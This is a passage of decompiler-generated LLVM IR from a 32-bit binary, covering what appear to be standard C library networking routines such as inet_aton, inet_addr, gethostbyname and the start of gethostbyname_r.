  %v0_805e6ff = load i32, i32* @ebp, align 4
  store i32 %v0_805e6ff, i32* %eax.global-to-local, align 4
  %v1_805e701 = trunc i32 %v0_805e6ff to i8
  %v2_805e701 = load i32, i32* @ebx, align 4
  %v3_805e701 = add i32 %v2_805e701, 1
  %v4_805e701 = inttoptr i32 %v3_805e701 to i8*
  store i8 %v1_805e701, i8* %v4_805e701, align 1
  %v0_805e704 = load i32, i32* @edx, align 4
  store i32 %v0_805e704, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805e70a

dec_label_pc_805e70a:                             ; preds = %dec_label_pc_805e659, %dec_label_pc_805e679, %dec_label_pc_805e6f8
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_805e6f8 ], [ %v1_805e679, %dec_label_pc_805e679 ], [ %v0_805e674, %dec_label_pc_805e659 ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_805e6f8 ], [ null, %dec_label_pc_805e679 ], [ null, %dec_label_pc_805e659 ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_805e74a.outer

dec_label_pc_805e716:                             ; preds = %dec_label_pc_805e6c1
  %v9_805e716 = icmp eq i32 %v0_805e6c1, 46
  %v1_805e719 = icmp eq i1 %v9_805e716, false
  br i1 %v1_805e719, label %dec_label_pc_805e7ea, label %dec_label_pc_805e71f

dec_label_pc_805e71f:                             ; preds = %dec_label_pc_805e716
  %v0_805e71f = load i32, i32* @ebx, align 4
  %v1_805e71f = add i32 %v0_805e71f, 4
  store i32 %v1_805e71f, i32* @esi, align 4
  %v6_805e726 = icmp ugt i32 %v1_805e71f, %v2_805e66a
  br i1 %v6_805e726, label %dec_label_pc_805e7ea, label %dec_label_pc_805e72c

dec_label_pc_805e72c:                             ; preds = %dec_label_pc_805e71f
  %v4_805e72c = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_805e72c, i32* @eax, align 4
  store i32 %v0_805e71f, i32* @edx, align 4
  store i32 %v1_805e71f, i32* @ebx, align 4
  %v2_805e734 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_805e734 = call i32 @inet_pton4(i32 %stack_var_-48.0.ph, i32 %v2_805e734, i32 %v2_805e66a)
  store i32 %v5_805e734, i32* %eax.global-to-local, align 4
  %tmp61 = icmp slt i32 %v5_805e734, 1
  %tmp62 = icmp eq i1 %tmp61, false
  br i1 %tmp62, label %dec_label_pc_805e781, label %dec_label_pc_805e7ea

dec_label_pc_805e74a:                             ; preds = %dec_label_pc_805e74a.outer, %dec_label_pc_805e6d8
  %v0_805e74a = phi i32 [ %v0_805e6dc, %dec_label_pc_805e6d8 ], [ %v0_805e74a.pre, %dec_label_pc_805e74a.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_805e6d8, %dec_label_pc_805e6d8 ], [ %stack_var_-44.1.ph, %dec_label_pc_805e74a.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_805e6dc, %dec_label_pc_805e6d8 ], [ %stack_var_-36.1.ph, %dec_label_pc_805e74a.outer ]
  %v1_805e74a = inttoptr i32 %v0_805e74a to i8*
  %v2_805e74a = load i8, i8* %v1_805e74a, align 1
  %v3_805e74a = sext i8 %v2_805e74a to i32
  store i32 %v3_805e74a, i32* %eax.global-to-local, align 4
  %v2_805e751 = call i32 @__GI_tolower(i32 %v3_805e74a)
  store i32 %v2_805e751, i32* %eax.global-to-local, align 4
  %v1_805e759 = icmp eq i32 %v2_805e751, 0
  store i32 %v2_805e751, i32* @esi, align 4
  %v1_805e75d = icmp eq i1 %v1_805e759, false
  br i1 %v1_805e75d, label %dec_label_pc_805e691, label %dec_label_pc_805e763

dec_label_pc_805e763:                             ; preds = %dec_label_pc_805e74a
  br i1 %v4_805e6c6, label %dec_label_pc_805e781, label %dec_label_pc_805e76a

dec_label_pc_805e76a:                             ; preds = %dec_label_pc_805e763
  %v0_805e76a = load i32, i32* @ebx, align 4
  %v1_805e76a = add i32 %v0_805e76a, 2
  store i32 %v1_805e76a, i32* @edx, align 4
  %v6_805e771 = icmp ugt i32 %v1_805e76a, %v2_805e66a
  br i1 %v6_805e771, label %dec_label_pc_805e7ea, label %dec_label_pc_805e773

dec_label_pc_805e773:                             ; preds = %dec_label_pc_805e76a
  %v0_805e773 = load i32, i32* @ebp, align 4
  %v2_805e775 = udiv i32 %v0_805e773, 256
  %v4_805e775 = trunc i32 %v2_805e775 to i8
  %v3_805e778 = inttoptr i32 %v0_805e76a to i8*
  store i8 %v4_805e775, i8* %v3_805e778, align 1
  %v0_805e77a = load i32, i32* @ebp, align 4
  store i32 %v0_805e77a, i32* %eax.global-to-local, align 4
  %v1_805e77c = trunc i32 %v0_805e77a to i8
  %v2_805e77c = load i32, i32* @ebx, align 4
  %v3_805e77c = add i32 %v2_805e77c, 1
  %v4_805e77c = inttoptr i32 %v3_805e77c to i8*
  store i8 %v1_805e77c, i8* %v4_805e77c, align 1
  %v0_805e77f = load i32, i32* @edx, align 4
  store i32 %v0_805e77f, i32* @ebx, align 4
  br label %dec_label_pc_805e781

dec_label_pc_805e781:                             ; preds = %dec_label_pc_805e763, %dec_label_pc_805e72c, %dec_label_pc_805e773
  %v4_805e781 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_805e781 = icmp eq i8* %stack_var_-44.1, null
  %v0_805e7b9.pre = load i32, i32* @ebx, align 4
  br i1 %v5_805e781, label %dec_label_pc_805e7b9, label %dec_label_pc_805e788

dec_label_pc_805e788:                             ; preds = %dec_label_pc_805e781
  store i32 1, i32* @esi, align 4
  %v6_805e78f = sub i32 %v0_805e7b9.pre, %v4_805e781
  store i32 %v6_805e78f, i32* @edi, align 4
  %v16_805e793 = icmp eq i32 %v0_805e7b9.pre, %v2_805e66a
  %v1_805e797 = icmp eq i1 %v16_805e793, false
  br i1 %v1_805e797, label %dec_label_pc_805e7b1.preheader, label %dec_label_pc_805e7ea

dec_label_pc_805e7b1.preheader:                   ; preds = %dec_label_pc_805e788
  %v3_805e7b188 = inttoptr i32 %v6_805e78f to i8*
  %v9_805e7b392 = icmp slt i8* %v3_805e7b188, inttoptr (i32 1 to i8*)
  br i1 %v9_805e7b392, label %dec_label_pc_805e7b5, label %dec_label_pc_805e79b

dec_label_pc_805e79b:                             ; preds = %dec_label_pc_805e7b1.preheader, %dec_label_pc_805e79b
  %v0_805e7a994 = phi i32 [ %v0_805e7b1.pre, %dec_label_pc_805e79b ], [ 1, %dec_label_pc_805e7b1.preheader ]
  %v0_805e79b93 = phi i32 [ %v1_805e7b1.pre, %dec_label_pc_805e79b ], [ %v6_805e78f, %dec_label_pc_805e7b1.preheader ]
  %v2_805e7a1 = sub i32 %v0_805e79b93, %v0_805e7a994
  %v6_805e7a3 = add i32 %v2_805e7a1, %v4_805e781
  store i32 %v6_805e7a3, i32* %eax.global-to-local, align 4
  %v2_805e7a7 = sub i32 %v2_805e66a, %v0_805e7a994
  store i32 %v2_805e7a7, i32* @ecx, align 4
  %v1_805e7a9 = add i32 %v0_805e7a994, 1
  store i32 %v1_805e7a9, i32* @esi, align 4
  %v1_805e7aa = inttoptr i32 %v6_805e7a3 to i8*
  %v2_805e7aa = load i8, i8* %v1_805e7aa, align 1
  %v3_805e7aa = zext i8 %v2_805e7aa to i32
  %v4_805e7aa = load i32, i32* @edx, align 4
  %v5_805e7aa = and i32 %v4_805e7aa, -256
  %v6_805e7aa = or i32 %v5_805e7aa, %v3_805e7aa
  store i32 %v6_805e7aa, i32* @edx, align 4
  %v3_805e7ac = inttoptr i32 %v2_805e7a7 to i8*
  store i8 %v2_805e7aa, i8* %v3_805e7ac, align 1
  %v0_805e7ae = load i32, i32* %eax.global-to-local, align 4
  %v1_805e7ae = inttoptr i32 %v0_805e7ae to i8*
  store i8 0, i8* %v1_805e7ae, align 1
  %v0_805e7b1.pre = load i32, i32* @esi, align 4
  %v1_805e7b1.pre = load i32, i32* @edi, align 4
  %v2_805e7b1 = inttoptr i32 %v0_805e7b1.pre to i8*
  %v3_805e7b1 = inttoptr i32 %v1_805e7b1.pre to i8*
  %v9_805e7b3 = icmp sgt i8* %v2_805e7b1, %v3_805e7b1
  br i1 %v9_805e7b3, label %dec_label_pc_805e7b5, label %dec_label_pc_805e79b

dec_label_pc_805e7b5:                             ; preds = %dec_label_pc_805e79b, %dec_label_pc_805e7b1.preheader
  br label %dec_label_pc_805e7b9

dec_label_pc_805e7b9:                             ; preds = %dec_label_pc_805e781, %dec_label_pc_805e7b5
  %v0_805e7b9 = phi i32 [ %v2_805e66a, %dec_label_pc_805e7b5 ], [ %v0_805e7b9.pre, %dec_label_pc_805e781 ]
  %v16_805e7b9 = icmp eq i32 %v0_805e7b9, %v2_805e66a
  %v1_805e7bd = icmp eq i1 %v16_805e7b9, false
  br i1 %v1_805e7bd, label %dec_label_pc_805e7ea, label %dec_label_pc_805e7bf

dec_label_pc_805e7bf:                             ; preds = %dec_label_pc_805e7b9
  store i32 %v2_805e65e, i32* %eax.global-to-local, align 4
  %tmp63 = inttoptr i32 %arg3 to i16*
  %v5_805e7cb = call i32 @memcpy(i16* %tmp63, i32 %v2_805e65e, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e7ec

dec_label_pc_805e7da:                             ; preds = %dec_label_pc_805e63e
  %v1_805e7da = call i32 @__errno_location(i32 %v0_805e62d)
  %v1_805e7df = inttoptr i32 %v1_805e7da to i32*
  store i32 97, i32* %v1_805e7df, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e7ec

dec_label_pc_805e7ea:                             ; preds = %dec_label_pc_805e6eb, %dec_label_pc_805e6e2, %dec_label_pc_805e6a6, %dec_label_pc_805e6cd, %dec_label_pc_805e788, %dec_label_pc_805e72c, %dec_label_pc_805e7b9, %dec_label_pc_805e76a, %dec_label_pc_805e71f, %dec_label_pc_805e716, %dec_label_pc_805e679
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e7ec

dec_label_pc_805e7ec:                             ; preds = %dec_label_pc_805e7da, %dec_label_pc_805e7bf, %dec_label_pc_805e649, %dec_label_pc_805e7ea
  %v0_805e7f3 = phi i32 [ -1, %dec_label_pc_805e7da ], [ 1, %dec_label_pc_805e7bf ], [ %v3_805e64f, %dec_label_pc_805e649 ], [ 0, %dec_label_pc_805e7ea ]
  store i32 %v0_805e62d, i32* @ebx, align 4
  store i32 %v0_805e62c, i32* @esi, align 4
  store i32 %v0_805e62b, i32* @edi, align 4
  store i32 %v0_805e62a, i32* @ebp, align 4
  ret i32 %v0_805e7f3

; uselistorder directives
  uselistorder i32 %v1_805e7b1.pre, { 1, 0 }
  uselistorder i32 %v0_805e7b1.pre, { 1, 0 }
  uselistorder i32 %v0_805e7a994, { 2, 1, 0 }
  uselistorder i32 %v0_805e7b9.pre, { 1, 0, 2 }
  uselistorder i32 %v2_805e751, { 1, 2, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v2_805e66a, { 0, 2, 3, 1, 7, 4, 5, 6, 8 }
  uselistorder i32 %v0_805e62d, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_805e7ec, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805e7ea, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_805e7b9, { 1, 0 }
  uselistorder label %dec_label_pc_805e79b, { 1, 0 }
  uselistorder label %dec_label_pc_805e781, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805e74a, { 1, 0 }
  uselistorder label %dec_label_pc_805e70a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805e74a.outer, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_805eadf = ptrtoint i8* %arg1 to i32
  store i32 %v4_805eadf, i32* @ecx, align 4
  %v1_805eae3 = icmp eq i8* %arg1, null
  br i1 %v1_805eae3, label %dec_label_pc_805eb64, label %dec_label_pc_805eae7

dec_label_pc_805eae7:                             ; preds = %entry
  %v0_805eaf2.pre = load i32, i32* @global_var_8074fcc, align 4
  br label %dec_label_pc_805eaf2

dec_label_pc_805eaf2:                             ; preds = %dec_label_pc_805eae7, %dec_label_pc_805eb3b
  %v2_805eb3b34 = phi i32 [ 1, %dec_label_pc_805eae7 ], [ %v3_805eb3b, %dec_label_pc_805eb3b ]
  %v0_805eaf833 = phi i32 [ %v4_805eadf, %dec_label_pc_805eae7 ], [ %v0_805eaf83, %dec_label_pc_805eb3b ]
  %v0_805eb5932 = phi i32 [ 0, %dec_label_pc_805eae7 ], [ %v2_805eb41, %dec_label_pc_805eb3b ]
  %v1_805eaf8 = inttoptr i32 %v0_805eaf833 to i8*
  %v2_805eaf8 = load i8, i8* %v1_805eaf8, align 1
  %v3_805eaf8 = sext i8 %v2_805eaf8 to i32
  %v2_805eafb = mul nsw i32 %v3_805eaf8, 2
  %v3_805eafb = add i32 %v2_805eafb, %v0_805eaf2.pre
  %v4_805eafb = inttoptr i32 %v3_805eafb to i8*
  %v5_805eafb = load i8, i8* %v4_805eafb, align 1
  %v6_805eafb = and i8 %v5_805eafb, 8
  %v7_805eafb = icmp eq i8 %v6_805eafb, 0
  br i1 %v7_805eafb, label %dec_label_pc_805eb64, label %dec_label_pc_805eb02

dec_label_pc_805eb02:                             ; preds = %dec_label_pc_805eaf2
  %v4_805eb16.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805eb16

dec_label_pc_805eb06:                             ; preds = %dec_label_pc_805eb16
  %v3_805eb06 = mul i32 %v1_805eb06, 10
  %v2_805eb09 = add i32 %v3_805eb06, -48
  %v3_805eb09 = add i32 %v2_805eb09, %v2_805eb18
  %v1_805eb0d = add i32 %v3_805eb09, -255
  %v6_805eb0d = sub i32 254, %v3_805eb09
  %v7_805eb0d = and i32 %v6_805eb0d, %v3_805eb09
  %v8_805eb0d = icmp slt i32 %v7_805eb0d, 0
  %v9_805eb0d = icmp eq i32 %v1_805eb0d, 0
  %v10_805eb0d = icmp slt i32 %v1_805eb0d, 0
  %v3_805eb13 = icmp eq i1 %v10_805eb0d, %v8_805eb0d
  %v4_805eb13 = icmp eq i1 %v9_805eb0d, false
  %v5_805eb13 = and i1 %v4_805eb13, %v3_805eb13
  br i1 %v5_805eb13, label %dec_label_pc_805eb64, label %dec_label_pc_805eb15

dec_label_pc_805eb15:                             ; preds = %dec_label_pc_805eb06
  %v1_805eb15 = add i32 %v0_805eb15, 1
  store i32 %v1_805eb15, i32* @ecx, align 4
  br label %dec_label_pc_805eb16

dec_label_pc_805eb16:                             ; preds = %dec_label_pc_805eb02, %dec_label_pc_805eb15
  %v1_805eb06 = phi i32 [ 0, %dec_label_pc_805eb02 ], [ %v3_805eb09, %dec_label_pc_805eb15 ]
  %v4_805eb16 = phi i32 [ %v4_805eb16.pre, %dec_label_pc_805eb02 ], [ %v6_805eb16, %dec_label_pc_805eb15 ]
  %v0_805eb15 = phi i32 [ %v0_805eaf833, %dec_label_pc_805eb02 ], [ %v1_805eb15, %dec_label_pc_805eb15 ]
  %v1_805eb16 = inttoptr i32 %v0_805eb15 to i8*
  %v2_805eb16 = load i8, i8* %v1_805eb16, align 1
  %v3_805eb16 = zext i8 %v2_805eb16 to i32
  %v5_805eb16 = and i32 %v4_805eb16, -256
  %v6_805eb16 = or i32 %v3_805eb16, %v5_805eb16
  store i32 %v6_805eb16, i32* @edx, align 4
  %v2_805eb18 = sext i8 %v2_805eb16 to i32
  %v2_805eb1b = mul nsw i32 %v2_805eb18, 2
  %v3_805eb1b = add i32 %v2_805eb1b, %v0_805eaf2.pre
  %v4_805eb1b = inttoptr i32 %v3_805eb1b to i16*
  %v5_805eb1b = load i16, i16* %v4_805eb1b, align 2
  %v2_805eb20 = and i16 %v5_805eb1b, 8
  %v3_805eb20 = icmp eq i16 %v2_805eb20, 0
  %v1_805eb22 = icmp eq i1 %v3_805eb20, false
  br i1 %v1_805eb22, label %dec_label_pc_805eb06, label %dec_label_pc_805eb24

dec_label_pc_805eb24:                             ; preds = %dec_label_pc_805eb16
  %v8_805eb24 = sub nsw i32 2, %v2_805eb3b34
  %v9_805eb24 = and i32 %v8_805eb24, %v2_805eb3b34
  %v10_805eb24 = icmp slt i32 %v9_805eb24, 0
  %v11_805eb24 = icmp eq i32 %v2_805eb3b34, 3
  %v12_805eb24 = icmp slt i32 %v2_805eb3b34, 3
  %v3_805eb28 = icmp eq i1 %v12_805eb24, %v10_805eb24
  %v4_805eb28 = icmp eq i1 %v11_805eb24, false
  %v5_805eb28 = and i1 %v4_805eb28, %v3_805eb28
  br i1 %v5_805eb28, label %dec_label_pc_805eb32, label %dec_label_pc_805eb2a

dec_label_pc_805eb2a:                             ; preds = %dec_label_pc_805eb24
  %v10_805eb2a = icmp eq i8 %v2_805eb16, 46
  %v1_805eb2d = icmp eq i1 %v10_805eb2a, false
  br i1 %v1_805eb2d, label %dec_label_pc_805eb64, label %dec_label_pc_805eb2f

dec_label_pc_805eb2f:                             ; preds = %dec_label_pc_805eb2a
  %v1_805eb2f = add i32 %v0_805eb15, 1
  store i32 %v1_805eb2f, i32* @ecx, align 4
  br label %dec_label_pc_805eb3b

dec_label_pc_805eb32:                             ; preds = %dec_label_pc_805eb24
  %v1_805eb32 = add i32 %v0_805eb15, 1
  store i32 %v1_805eb32, i32* @ecx, align 4
  %v4_805eb33 = icmp eq i8 %v2_805eb16, 0
  br i1 %v4_805eb33, label %dec_label_pc_805eb3b, label %dec_label_pc_805eb37

dec_label_pc_805eb37:                             ; preds = %dec_label_pc_805eb32
  %v2_805eb37 = and i16 %v5_805eb1b, 32
  %v3_805eb37 = icmp eq i16 %v2_805eb37, 0
  br i1 %v3_805eb37, label %dec_label_pc_805eb64, label %dec_label_pc_805eb3b

dec_label_pc_805eb3b:                             ; preds = %dec_label_pc_805eb37, %dec_label_pc_805eb32, %dec_label_pc_805eb2f
  %v0_805eaf83 = phi i32 [ %v1_805eb32, %dec_label_pc_805eb37 ], [ %v1_805eb32, %dec_label_pc_805eb32 ], [ %v1_805eb2f, %dec_label_pc_805eb2f ]
  %v3_805eb3b = add nuw nsw i32 %v2_805eb3b34, 1
  %v2_805eb3e = mul i32 %v0_805eb5932, 256
  %v2_805eb41 = or i32 %v1_805eb06, %v2_805eb3e
  %v7_805eb47 = icmp sgt i32 %v2_805eb3b34, 3
  br i1 %v7_805eb47, label %dec_label_pc_805eb49, label %dec_label_pc_805eaf2

dec_label_pc_805eb49:                             ; preds = %dec_label_pc_805eb3b
  %v4_805eb49 = icmp eq i32 %arg2, 0
  br i1 %v4_805eb49, label %dec_label_pc_805eb66, label %dec_label_pc_805eb55

dec_label_pc_805eb55:                             ; preds = %dec_label_pc_805eb49
  %v1_805eb59 = call i32 @llvm.bswap.i32(i32 %v2_805eb41)
  %v2_805eb5b = inttoptr i32 %arg2 to i32*
  store i32 %v1_805eb59, i32* %v2_805eb5b, align 4
  br label %dec_label_pc_805eb66

dec_label_pc_805eb64:                             ; preds = %dec_label_pc_805eb37, %dec_label_pc_805eb2a, %dec_label_pc_805eaf2, %dec_label_pc_805eb06, %entry
  br label %dec_label_pc_805eb66

dec_label_pc_805eb66:                             ; preds = %dec_label_pc_805eb49, %dec_label_pc_805eb55, %dec_label_pc_805eb64
  %v0_805eb6b = phi i32 [ 1, %dec_label_pc_805eb49 ], [ 1, %dec_label_pc_805eb55 ], [ 0, %dec_label_pc_805eb64 ]
  ret i32 %v0_805eb6b

; uselistorder directives
  uselistorder i32 %v2_805eb18, { 1, 0 }
  uselistorder i32 %v6_805eb16, { 1, 0 }
  uselistorder i8 %v2_805eb16, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805eb15, { 0, 1, 3, 2 }
  uselistorder i32 %v1_805eb0d, { 1, 0 }
  uselistorder i32 %v3_805eb09, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805eaf833, { 1, 0 }
  uselistorder i32 %v2_805eb3b34, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805eb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805eb64, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_805eb16, { 1, 0 }
  uselistorder label %dec_label_pc_805eaf2, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_805ebd3 = ptrtoint i32* %stack_var_-4 to i32
  %v2_805ebdc = inttoptr i32 %arg1 to i8*
  %v3_805ebdc = call i32 @inet_aton(i8* %v2_805ebdc, i32 %v2_805ebd3)
  store i32 -1, i32* @edx, align 4
  %v1_805ebe7 = icmp eq i32 %v3_805ebdc, 0
  br i1 %v1_805ebe7, label %dec_label_pc_805ebef, label %dec_label_pc_805ebeb

dec_label_pc_805ebeb:                             ; preds = %entry
  %v3_805ebeb = load i32, i32* %stack_var_-4, align 4
  store i32 %v3_805ebeb, i32* @edx, align 4
  br label %dec_label_pc_805ebef

dec_label_pc_805ebef:                             ; preds = %entry, %dec_label_pc_805ebeb
  %v0_805ebef = phi i32 [ -1, %entry ], [ %v3_805ebeb, %dec_label_pc_805ebeb ]
  ret i32 %v0_805ebef

; uselistorder directives
  uselistorder label %dec_label_pc_805ebef, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_805ebfb = call i32 @__GI___h_errno_location()
  %v0_805ec00 = load i32, i32* @edx, align 4
  %v2_805ec03 = ptrtoint i32* %stack_var_-4 to i32
  %v8_805ec1b = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_807d88c.722, i32 ptrtoint (i32* @global_var_807d6c0.721 to i32), i32 460, i32 %v2_805ec03, i32 %v0_805ebfb, i32 %v0_805ec00)
  %v3_805ec20 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_805ec20
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i64 @__decompiler_undefined_function_2()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_805ec28 = load i32, i32* @ebp, align 4
  %v0_805ec29 = load i32, i32* @edi, align 4
  %v0_805ec2a = load i32, i32* @esi, align 4
  %v0_805ec2b = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_805ec3b = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_805ec3b, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_805ec46 = icmp eq i32 %arg1, 0
  br i1 %v4_805ec46, label %dec_label_pc_805ef52, label %dec_label_pc_805ec51

dec_label_pc_805ec51:                             ; preds = %entry
  %v1_805ec51 = call i32 @__errno_location(i32 %v0_805ec2b)
  store i32 %v1_805ec51, i32* %eax.global-to-local, align 4
  %v1_805ec56 = inttoptr i32 %v1_805ec51 to i32*
  %v2_805ec56 = load i32, i32* %v1_805ec56, align 4
  store i32 %v2_805ec56, i32* @edi, align 4
  store i32 %v1_805ec51, i32* @esi, align 4
  store i32 0, i32* %v1_805ec56, align 4
  %v0_805ec69 = load i32, i32* @ebx, align 4
  store i32 %v0_805ec69, i32* %stack_var_-108, align 4
  %v7_805ec75 = call i32 @__get_hosts_byname_r(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_805ec69, i32 %arg5, i32 %arg6, i32 %v1_805ec51)
  store i32 %v7_805ec75, i32* %eax.global-to-local, align 4
  %v1_805ec7d = icmp eq i32 %v7_805ec75, 0
  br i1 %v1_805ec7d, label %dec_label_pc_805ef52, label %dec_label_pc_805ec85

dec_label_pc_805ec85:                             ; preds = %dec_label_pc_805ec51
  store i32 %arg6, i32* @ecx, align 4
  %v1_805ec89 = inttoptr i32 %arg6 to i32*
  %v2_805ec89 = load i32, i32* %v1_805ec89, align 4
  store i32 %v2_805ec89, i32* %edx.global-to-local, align 4
  %v9_805ec8b = icmp eq i32 %v2_805ec89, 1
  br i1 %v9_805ec8b, label %dec_label_pc_805eca5, label %dec_label_pc_805ec90

dec_label_pc_805ec90:                             ; preds = %dec_label_pc_805ec85
  %v9_805ec90 = icmp eq i32 %v2_805ec89, 4
  br i1 %v9_805ec90, label %dec_label_pc_805eca5, label %dec_label_pc_805ec95

dec_label_pc_805ec95:                             ; preds = %dec_label_pc_805ec90
  %v1_805ec95 = add i32 %v2_805ec89, 1
  %v8_805ec95 = icmp eq i32 %v1_805ec95, 0
  store i32 %v1_805ec95, i32* %edx.global-to-local, align 4
  %v1_805ec96 = icmp eq i1 %v8_805ec95, false
  br i1 %v1_805ec96, label %dec_label_pc_805ef52, label %dec_label_pc_805ec9c

dec_label_pc_805ec9c:                             ; preds = %dec_label_pc_805ec95
  %v0_805ec9c = load i32, i32* @esi, align 4
  %v1_805ec9c = inttoptr i32 %v0_805ec9c to i32*
  %v2_805ec9c = load i32, i32* %v1_805ec9c, align 4
  %v11_805ec9c = icmp eq i32 %v2_805ec9c, 2
  %v1_805ec9f = icmp eq i1 %v11_805ec9c, false
  br i1 %v1_805ec9f, label %dec_label_pc_805ef52, label %dec_label_pc_805eca5

dec_label_pc_805eca5:                             ; preds = %dec_label_pc_805ec9c, %dec_label_pc_805ec90, %dec_label_pc_805ec85
  %v0_805eca5 = load i32, i32* @ebp, align 4
  %v1_805eca7 = sub i32 0, %v0_805eca5
  %v1_805eca9 = urem i32 %v1_805eca7, 4
  %v2_805eca9 = icmp eq i32 %v1_805eca9, 0
  store i32 %v1_805eca9, i32* %eax.global-to-local, align 4
  %v0_805ecac = load i32, i32* @edi, align 4
  %v1_805ecac = load i32, i32* @esi, align 4
  %v2_805ecac = inttoptr i32 %v1_805ecac to i32*
  store i32 %v0_805ecac, i32* %v2_805ecac, align 4
  %v0_805ecc0.pre = load i32, i32* @ebx, align 4
  br i1 %v2_805eca9, label %dec_label_pc_805ecbc, label %dec_label_pc_805ecb0

dec_label_pc_805ecb0:                             ; preds = %dec_label_pc_805eca5
  %v1_805ecb0 = load i32, i32* %eax.global-to-local, align 4
  %v2_805ecb0 = sub i32 %v0_805ecc0.pre, %v1_805ecb0
  %v7_805ecb0 = icmp ult i32 %v0_805ecc0.pre, %v1_805ecb0
  br i1 %v7_805ecb0, label %dec_label_pc_805ef4d, label %dec_label_pc_805ecb8

dec_label_pc_805ecb8:                             ; preds = %dec_label_pc_805ecb0
  %v0_805ecb8 = load i32, i32* @ebp, align 4
  %v2_805ecb8 = add i32 %v0_805ecb8, %v1_805ecb0
  store i32 %v2_805ecb8, i32* @ebp, align 4
  store i32 %v2_805ecb0, i32* @ebx, align 4
  br label %dec_label_pc_805ecbc

dec_label_pc_805ecbc:                             ; preds = %dec_label_pc_805eca5, %dec_label_pc_805ecb8
  %v0_805ecc0 = phi i32 [ %v2_805ecb0, %dec_label_pc_805ecb8 ], [ %v0_805ecc0.pre, %dec_label_pc_805eca5 ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_805ec89, align 4
  %tmp41 = icmp ult i32 %v0_805ecc0, 4
  br i1 %tmp41, label %dec_label_pc_805ef4d, label %dec_label_pc_805eccf

dec_label_pc_805eccf:                             ; preds = %dec_label_pc_805ecbc
  %v0_805eccf = load i32, i32* @ebx, align 4
  %v1_805eccf = add i32 %v0_805eccf, -4
  store i32 %v1_805eccf, i32* %eax.global-to-local, align 4
  %tmp42 = icmp ult i32 %v1_805eccf, 8
  br i1 %tmp42, label %dec_label_pc_805ef4d, label %dec_label_pc_805ecdb

dec_label_pc_805ecdb:                             ; preds = %dec_label_pc_805eccf
  %v1_805ecdb = add i32 %v0_805eccf, -12
  store i32 %v1_805ecdb, i32* %eax.global-to-local, align 4
  %v0_805ecde = load i32, i32* @ebp, align 4
  %v1_805ecde = add i32 %v0_805ecde, 4
  store i32 %v1_805ecde, i32* %edx.global-to-local, align 4
  store i32 %v1_805ecde, i32* %stack_var_-92, align 4
  %v3_805ece7 = inttoptr i32 %v1_805ecde to i32*
  store i32 %v0_805ecde, i32* %v3_805ece7, align 4
  %v0_805ecea = load i32, i32* %edx.global-to-local, align 4
  %v1_805ecea = add i32 %v0_805ecea, 4
  %v2_805ecea = inttoptr i32 %v1_805ecea to i32*
  store i32 0, i32* %v2_805ecea, align 4
  %tmp43 = icmp ult i32 %v1_805ecdb, 32
  br i1 %tmp43, label %dec_label_pc_805ef4d, label %dec_label_pc_805ecf7

dec_label_pc_805ecf7:                             ; preds = %dec_label_pc_805ecdb
  %v0_805ecf7 = load i32, i32* @ebx, align 4
